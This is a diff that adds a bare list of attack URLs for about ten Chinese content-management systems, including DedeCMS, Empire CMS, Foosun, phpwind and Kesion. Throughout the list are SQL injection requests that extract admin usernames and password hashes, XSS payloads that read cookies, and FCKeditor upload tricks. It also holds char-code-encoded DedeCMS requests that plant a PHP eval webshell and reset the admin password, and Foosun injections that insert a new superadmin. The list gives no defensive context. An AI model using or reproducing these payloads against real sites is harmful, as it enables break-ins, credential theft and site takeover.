@@ -1,0 +1,63 @@
+# 来源: Z-blog.txt
+/Z-Blog18/FUNCTION/c_urlredirect.asp?url=jxaxvxaxsxcxrxixpxtx%3Ax%22x%3Ex%3Cxsxcxrxixpxtx+xsxrxcx%3Dxhxtxtxpx%3Ax%2Fx%2Fx1��2��7x%2Ex0x%2Ex0x%2Ex1x%2Fx1x%2Exjxsx%3Ex%3Cx%2Fxsxcxrxixpxtx%3Ex4
+/admin/FCKeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php
+/catalog.asp?tags=Z-Blog"></title><script>alert('sebug')</script>
+/function/c_error.asp?errorid=7&number=0&description=&source=&sourceurl=javascript:alert(document.cookie
+
+# 来源: blueCMS v1.6 sp1 ad_js.php SQL注入漏洞.txt
+/cms/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,concat(admin_name,0x7C0D0A,pwd),concat(admin_name,0x7C0D0A,pwd)%20from%20blue_admin%20where%20admin_id=1
+
+# 来源: Kesion cms注入漏洞.txt
+/plus/Ajaxs.asp?action=GetRelativeItem&Key=goingta%2525%2527%2529%2520%2575%256E%2569%256F%256E%2520%2573%2565%256C%2565%2563%2574%25201,2,username%252B%2527%257C%2527%252Bpassword%20from%20KS_Admin%2500
+/plus/ajaxs.asp?action=GetRelativeItem&key=search%2525%2527%2529%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2575%2573%2565%2572%256e%2561%256d%2565%252b%2527%257c%2527%252b%2570%2561%2573%2573%2577%256f%2572%2564%2520%2566%2572%256f%256d%2520%254b%2553%255f%2541%2564%256d%2569%256e%2500
+/user/reg/regajax.asp?action=getcityoption&province=goingta%2527%2520union%2520%2573%2565%256C%2565%2563%2574%25201,username%252B%2527%257C%2527%252Bpassword%2520from%2520KS_Admin%2500
+
+# 来源: phpweb伪静态页面注入.txt
+/page/html/?56'/**/and/**/(SELECT/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),(substring((select(version())),1,62)))a/**/from/**/information_schema.tables/**/group/**/by/**/a)b)=1/*.html
+
+# 来源: phpwind某注入.txt
+/admin.php?adminjob=apps&admintype=groups_manage&action=argument&keyword=1&ttable=/**/tm ON t.tid=tm.tid LEFT JOIN pw_argument a ON t.tid=a.tid LEFT JOIN pw_colonys c ON a.cyid=c.id WHERE (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),CONCAT(0x3a,(SELECT USER())))a from information_schema.tables group by a)b)%23
+
+# 来源: 动科(dkcms).txt
+/Admin/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/mk.asp&NewFolderName=mk.asp
+
+# 来源: 帝国CMS5.txt
+(123),userid,char(95),username,char(95),password,char(125))+from+phome_enewsuser/*
+/e/member/list/index.php?sear=1&totalnum=1&keyboard=%D9''+union+select+1,1,1,concat(char
+/e/member/list/index.php?sear=1&totalnum=1&keyboard=%D9'+union+select+1,1,1,concat(char2.(123),userid,char(95),username,char(95),password,char(125))+from+phome_enewsuser/*
+/e/member/list/index.php?sear=1&totalnum=1&keyboard=%D9'+union+select+1,1,1,concat(char2.(123),userid,char(95),username,char(95),password,char(125))+from+phome_enewsuser3.
+
+# 来源: 新云管理系统6.0.txt
+/database/NewCloud6.mdb
+
+# 来源: 易迅.txt
+/User/User_Message.asp?Action=Del&ManageType=Inbox&MessageID=90
+
+# 来源: 织梦.txt
+/data/admin/ver.txt
+/include/inc/inc_fun_help.php
+/member/ajax_membergroup.php?action=post&membergroup=1
+/member/ajax_membergroup.php?action=post&membergroup=@`'`%20Union%20select%20pwd%20from%20`%23@__admin`%20where%201%20or%20id=@
+/plus/ad_js.php?aid=1
+/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=120&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=109&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=32&arrs2[]=35
+/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=64&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=98&arrs2[]=97&arrs2[]=115&arrs2[]=101&arrs2[]=54&arrs2[]=52&arrs2[]=95&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=111&arrs2[]=100&arrs2[]=101&arrs2[]=40&arrs2[]=92&arrs2[]=39&arrs2[]=90&arrs2[]=110&arrs2[]=66&arrs2[]=49&arrs2[]=100&arrs2[]=72&arrs2[]=77&arrs2[]=111&arrs2[]=90&arrs2[]=109&arrs2[]=57&arrs2[]=119&arrs2[]=90&arrs2[]=87&arrs2[]=52&arrs2[]=111&arrs2[]=74&arrs2[]=121&arrs2[]=52&arrs2[]=117&arrs2[]=76&arrs2[]=50&arrs2[]=108&arrs2[]=117&arrs2[]=89&arrs2[]=50&arrs2[]=120&arrs2[]=49&arrs2[]=90&arrs2[]=71&arrs2[]=85&arrs2[]=118&arrs2[]=97&arrs2[]=87&arrs2[]=53&arrs2[]=106&arrs2[]=76&arrs2[]=50&arrs2[]=108&arrs2[]=117&arrs2[]=89&arrs2[]=49&arrs2[]=57&arrs2[]=109&arrs2[]=100&arrs2[]=87&arrs2[]=53&arrs2[]=102&arrs2[]=97&arrs2[]=71&arrs2[]=86&arrs2[]=115&arrs2[]=99&arrs2[]=67&arrs2[]=53&arrs2[]=119&arrs2[]=97&arrs2[]=72&arrs2[]=65&arrs2[]=110&arrs2[]=76&arrs2[]=67&arrs2[]=100&arrs2[]=51&arrs2[]=74&arrs2[]=121&arrs2[]=107&arrs2[]=115&arrs2[]=74&arrs2[]=122&arrs2[]=119&arrs2[]=47&arrs2[]=99&arrs2[]=71&arrs2[]=104&arrs2[]=119&arrs2[]=73&arrs2[]=71&arrs2[]=86&arrs2[]=50&arrs2[]=89&arrs2[]=87&arrs2[]=119&arrs2[]=111&arrs2[]=74&arrs2[]=70&arrs2[]=57&arrs2[]=81&arrs2[]=84&arrs2[]=49&arrs2[]=78&arrs2[]=85&arrs2[]=87&arrs2[]=50&arrs2[]=78&arrs2[]=116&arrs2[]=90&arrs2[]=70&arrs2[]=48&arrs2[]=112&arrs2[]=80&arrs2[]=122&arrs2[]=52&arrs2[]=110&arrs2[]=75&arrs2[]=84&arrs2[]=115&arrs2[]=61&arrs2[]=92&arrs2[]=39&arrs2[]=41&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=32&arrs2[]=35
+/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=97&arrs2[]=100&arrs2[]=109&arrs2[]=105&arrs2[]=110&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=117&arrs2[]=115&arrs2[]=101&arrs2[]=114&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=115&arrs2[]=112&arrs2[]=105&arrs2[]=100&arrs2[]=101&arrs2[]=114&arrs2[]=39&arrs2[]=44&arrs2[]=32&arrs2[]=96&arrs2[]=112&arrs2[]=119&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=102&arrs2[]=50&arrs2[]=57&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=97&arrs2[]=55&arrs2[]=52&arrs2[]=51&arrs2[]=56&arrs2[]=57&arrs2[]=52&arrs2[]=97&arrs2[]=48&arrs2[]=101&arrs2[]=52&arrs2[]=39&arrs2[]=32&arrs2[]=119&arrs2[]=104&arrs2[]=101&arrs2[]=114&arrs2[]=101&arrs2[]=32&arrs2[]=105&arrs2[]=100&arrs2[]=61&arrs2[]=49&arrs2[]=32&arrs2[]=35
+/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa\'and+char(@`'`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x3C6162633E,group_concat(0x7C,userid,0x3a,pwd,0x7C),0x3C2F6162633E),5,6,7,8,9%20from%20`%23@__admin`%23"
+/plus/search.php?keyword=as&typeArr[ uNion ]=
+/plus/search.php?keyword=xxx&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=102&arrs1[]=95&arrs1[]=115&arrs1[]=116&arrs1[]=121&arrs1[]=108&arrs1[]=101&arrs2[]=47&arrs2[]=46&arrs2[]=46&arrs2[]=47&arrs2[]=46&arrs2[]=46&arrs2[]=47&arrs2[]=100&arrs2[]=97&arrs2[]=116&arrs2[]=97&arrs2[]=47&arrs2[]=99&arrs2[]=111&arrs2[]=109&arrs2[]=109&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=105&arrs2[]=110&arrs2[]=99&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=0
+
+# 来源: 逐浪CMS3.2 0.txt
+/Search/Searc ... =0&keyword=1%25()=0%20oR%20''%25''=''&type=1
+/Search/Searc ... ype=1&keyword=1ay
+/editor/filem ... px%2Fconnector.aspx
+/prompt/correct.aspx?t=
+
+# 来源: 风讯.txt
+/User/favorite.asp?Action= sort&id=1&classID=1
+/User/i_Blog/PublicLogEdit.asp?id=2;insert%0D%0A%0D%0Ainto%20FS_MF_Admin%20(Admin_Name,Admin_Pass_Word,Admin_Is_Super)values(0x6F006C0064006A0075006E00,0x380033006100610034003000300
+/User/i_Blog/PublicLogEdit.asp?id=2;insert%0D%0A%0D%0Ainto%20FS_MF_Admin%20(Admin_Name,Admin_Pass_Word,Admin_Is_Super)values(0x6F006C0064006A0075006E00,0x3800330061006100340030003000610066003400360034006300370036006400,1)--
+/User/setnextoptions.asp?EquValue=1&ReqSql=select%201,ADMIN_pass_word,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%20from%20FS_MF_ADMIN%20w
+/stat/mystat.aspx?code='</script>")<iframe src='http://www.baidu.com' width='100%' height='100%' frameborder=no border=0>
+/user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1admin_name345678++from+FS_MF_Admin
+/user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1admin_pass_word345678++from+FS_MF_Admin
+
